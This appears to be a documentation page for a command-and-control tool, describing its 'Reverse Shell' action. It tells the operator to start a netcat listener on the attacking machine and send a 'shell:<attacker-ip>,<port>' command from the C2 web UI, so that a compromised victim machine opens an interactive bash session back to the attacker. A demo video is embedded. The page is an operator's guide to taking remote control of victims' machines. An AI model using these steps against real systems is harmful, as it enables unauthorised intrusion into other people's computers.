---
title: Reverse Shell
description: Opens an interactive bash session from the victim back to the attacker.
---

A reverse shell connects back from the victim to the attacker, providing an interactive TTY. The shell runs non-blocking so it does not stall the C2 polling thread.

Start a TCP listener on the attacking machine before sending the action:

```sh
nc -lvnp <port>
```

Then send the action from the C2 web UI:

```
shell:<attacker-ip>,<port>
```

<video controls style="width:100%;max-width:800px;display:block;margin:1.5rem auto;border-radius:6px;">
  <source src="/reverse-shell.mkv" type="video/x-matroska"/>
</video>
